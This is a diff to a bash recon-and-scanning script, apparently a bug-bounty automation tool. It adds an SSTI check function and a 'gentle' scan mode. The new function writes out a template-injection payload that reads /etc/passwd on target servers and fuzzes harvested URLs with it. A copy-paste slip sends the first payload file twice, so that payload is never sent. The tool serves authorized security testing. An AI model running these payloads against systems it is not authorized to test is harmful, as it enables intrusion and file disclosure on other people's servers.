@@ -360,7 +360,7 @@ sub_scraping(){
 			touch .tmp/scrap_subs.txt
 			cat ${domain}_subdomains.txt | httpx -follow-host-redirects -H "${HEADER}" -status-code -timeout 15 -silent -no-color | grep '\[200\]' | cut -d ' ' -f1 | anew -q .tmp/${domain}_probed_tmp.txt
 			eval python3 $tools/JSFinder/JSFinder.py -f .tmp/${domain}_probed_tmp.txt -os .tmp/scrap_subs.txt $DEBUG_STD
-			galer -u .tmp/${domain}_probed_tmp.txt -s | grep ".$domain" | unfurl --unique domains | anew -q .tmp/scrap_subs.txt
+			eval galer -u .tmp/${domain}_probed_tmp.txt -s  $DEBUG_ERROR | grep ".$domain" | unfurl --unique domains | anew -q .tmp/scrap_subs.txt
 			cat .tmp/scrap_subs.txt | eval shuffledns -d $domain -r $resolvers -t 5000 -o .tmp/scrap_subs_resolved.txt $DEBUG_STD
 			NUMOFLINES=$(eval cat .tmp/scrap_subs_resolved.txt $DEBUG_ERROR | anew ${domain}_subdomains.txt | wc -l)
 			touch $called_fn_dir/.${FUNCNAME[0]}
@@ -646,16 +646,16 @@ url_gf(){
 			printf "${bblue} Vulnerable Pattern Search ${reset}\n\n"
 			start=`date +%s`
 			mkdir -p gf
-			gf xss ${domain}_url_extract.txt | anew -q gf/${domain}_xss.txt;
-			gf ssti ${domain}_url_extract.txt | anew -q gf/${domain}_ssti.txt;
-			gf ssrf ${domain}_url_extract.txt | anew -q gf/${domain}_ssrf.txt;
-			gf sqli ${domain}_url_extract.txt | anew -q gf/${domain}_sqli.txt;
-			gf redirect ${domain}_url_extract.txt | anew -q gf/${domain}_redirect.txt;
-			gf rce ${domain}_url_extract.txt | anew -q gf/${domain}_rce.txt;
-			gf potential ${domain}_url_extract.txt | anew -q gf/${domain}_potential.txt;
-			cat ${domain}_url_extract.txt | unfurl -u format %s://%d%p | anew -q gf/${domain}_endpoints.txt;
+			gf xss ${domain}_url_extract.txt | anew -q gf/${domain}_xss.txt
+			gf ssti ${domain}_url_extract.txt | anew -q gf/${domain}_ssti.txt
+			gf ssrf ${domain}_url_extract.txt | anew -q gf/${domain}_ssrf.txt
+			gf sqli ${domain}_url_extract.txt | anew -q gf/${domain}_sqli.txt
+			gf redirect ${domain}_url_extract.txt | anew -q gf/${domain}_redirect.txt && cat gf/${domain}_ssrf.txt | anew -q gf/${domain}_redirect.txt
+			gf rce ${domain}_url_extract.txt | anew -q gf/${domain}_rce.txt
+			gf potential ${domain}_url_extract.txt | anew -q gf/${domain}_potential.txt
+			cat ${domain}_url_extract.txt | unfurl -u format %s://%d%p | anew -q gf/${domain}_endpoints.txt
 			gf lfi ${domain}_url_extract.txt | anew -q gf/${domain}_lfi.txt
-			touch $called_fn_dir/.${FUNCNAME[0]};
+			touch $called_fn_dir/.${FUNCNAME[0]}
 			end=`date +%s`
 			getElapsedTime $start $end
 			printf "${bblue}\n Vulnerable Pattern Search Finished in ${runtime}\n"
@@ -784,13 +784,15 @@ github(){
 			if [ -s "${GITHUB_TOKENS}" ]
 			then
 				if [ "$DEEP" = true ] ; then
-					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -q $domain -e 10 -d $tools/GitDorker/Dorks/alldorksv3 | grep "\[+\]" | anew -q ${domain}_gitrecon.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
+					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -q $domain -p -d $tools/GitDorker/Dorks/alldorksv3 | grep "\[+\]" | anew -q ${domain}_gitrecon.txt $DEBUG_STD
 				else
-					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -q $domain -e 10 -d $tools/GitDorker/Dorks/medium_dorks.txt | grep "\[+\]" | anew -q ${domain}_gitrecon.txt $DEBUG_STD && touch $called_fn_dir/.${FUNCNAME[0]}
+					eval python3 $tools/GitDorker/GitDorker.py -tf ${GITHUB_TOKENS} -q $domain -p -d $tools/GitDorker/Dorks/medium_dorks.txt | grep "\[+\]" | anew -q ${domain}_gitrecon.txt $DEBUG_STD
 				fi
+				sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" ${domain}_gitrecon.txt
 			else
 				printf "\n${bred} Required file ${GITHUB_TOKENS} not exists or empty${reset}\n"
 			fi
+			touch $called_fn_dir/.${FUNCNAME[0]}
 			end=`date +%s`
 			getElapsedTime $start $end
 			printf "${bblue}\n GitHub Scanning Finished in ${runtime}\n"
@@ -970,7 +972,8 @@ ssrf_checks(){
 			if [ "$DEEP" = true ] ; then
 				start=`date +%s`
 				COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
-				eval cat gf/${domain}_ssrf.txt $DEBUG_ERROR | eval python3 $tools/ssrf.py $COLLAB_SERVER_FIX > ${domain}_ssrf.txt $DEBUG_ERROR && touch $called_fn_dir/.${FUNCNAME[0]}
+				eval python3 $tools/ssrf.py gf/${domain}_ssrf.txt $COLLAB_SERVER_FIX > ${domain}_ssrf.txt $DEBUG_ERROR
+				touch $called_fn_dir/.${FUNCNAME[0]}
 				end=`date +%s`
 				getElapsedTime $start $end
 				printf "${bblue}\n SSRF Finished in ${runtime}\n"
@@ -980,7 +983,8 @@ ssrf_checks(){
 				then
 					start=`date +%s`
 					COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
-					eval cat gf/${domain}_ssrf.txt $DEBUG_ERROR | eval python3 $tools/ssrf.py $COLLAB_SERVER_FIX > ${domain}_ssrf.txt $DEBUG_ERROR && touch $called_fn_dir/.${FUNCNAME[0]}
+					eval python3 $tools/ssrf.py gf/${domain}_ssrf.txt $COLLAB_SERVER_FIX > ${domain}_ssrf.txt $DEBUG_ERROR
+					touch $called_fn_dir/.${FUNCNAME[0]}
 					end=`date +%s`
 					getElapsedTime $start $end
 					printf "${bblue}\n SSRF Finished in ${runtime}\n"
@@ -1029,6 +1033,30 @@ lfi(){
 			getElapsedTime $start $end
 			printf "${bblue}\n LFI Finished in ${runtime}${reset}\n"
 			printf "${bblue} Results are saved in ${domain}_lfi.txt ${reset}\n"
+			printf "${bgreen}#######################################################################\n"
+		else
+			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
+	fi
+}
+
+ssti(){
+	if ([ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]) && [ "$SSTI" = true ]
+		then
+			printf "${bgreen}#######################################################################\n"
+			printf "${bblue} SSTI checks ${reset}\n"
+			start=`date +%s`
+
+			cat gf/${domain}_ssti.txt | qsreplace "ssti{{7*7}}" | anew -q .tmp/ssti_fuzz.txt
+			ffuf -v -mc 200 -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "ssti49" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_ssti.txt
+
+			cat gf/${domain}_ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | anew -q .tmp/ssti_fuzz2.txt
+			ffuf -v -mc 200 -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${domain}_ssti.txt
+
+			touch $called_fn_dir/.${FUNCNAME[0]}
+			end=`date +%s`
+			getElapsedTime $start $end
+			printf "${bblue}\n SSTI Finished in ${runtime}${reset}\n"
+			printf "${bblue} Results are saved in ${domain}_ssti.txt ${reset}\n"
 			printf "${bgreen}#######################################################################\n"
 		else
 			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
@@ -1125,6 +1153,7 @@ all(){
 			ssrf_checks
 			crlf_checks
 			lfi
+			ssti
 			jschecks
 			xss
 			test_ssl
@@ -1152,6 +1181,7 @@ all(){
 		ssrf_checks
 		crlf_checks
 		lfi
+		ssti
 		jschecks
 		xss
 		test_ssl
@@ -1170,6 +1200,7 @@ help(){
 	printf " ${bblue}MODE OPTIONS${reset}\n"
 	printf "   -a               Perform all checks\n"
 	printf "   -s               Full subdomains scan (Subs, tko and probe)\n"
+	printf "   -g               Gentle mode (Dorks, Subs, ports, nuclei, fuzz, cors and ssl)\n"
 	printf "   -w               Perform web checks only without subs ${yellow}(-l required)${reset}\n"
 	printf "   -i               Check all needed tools\n"
 	printf "   -v               Debug/verbose mode, no file descriptor redir\n"
@@ -1273,6 +1304,7 @@ while getopts ":hd:-:l:x:vaisxwgto:" opt; do
 			ssrf_checks
 			crlf_checks
 			lfi
+			ssti
 			jschecks
 			xss
 			test_ssl
@@ -1280,6 +1312,24 @@ while getopts ":hd:-:l:x:vaisxwgto:" opt; do
 			exit
 			;;
 		i ) tools_full
+			exit
+			;;
+		g ) start
+			dorks
+			subdomains_full
+			subtakeover
+			webprobe_full
+			screenshot
+			portscan
+			nuclei_check
+			github
+			favicon
+			cms_scanner
+			brokenLinks
+			fuzz
+			cors
+			test_ssl
+			end
 			exit
 			;;
 		o ) dir_output=$OPTARG
